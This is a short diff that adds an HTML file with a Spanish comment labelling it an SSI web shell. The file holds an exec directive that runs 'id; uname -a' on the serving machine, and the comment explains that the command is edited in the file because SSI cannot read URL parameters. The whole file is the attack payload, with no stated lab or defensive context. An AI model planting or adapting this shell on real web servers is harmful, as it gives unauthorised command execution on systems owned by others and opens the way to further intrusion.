@@ -1,0 +1,2 @@
+<!-- SSI webshell: SSI no lee parametros de URL, edita el comando aqui abajo -->
+<!--#exec cmd="id; uname -a" -->
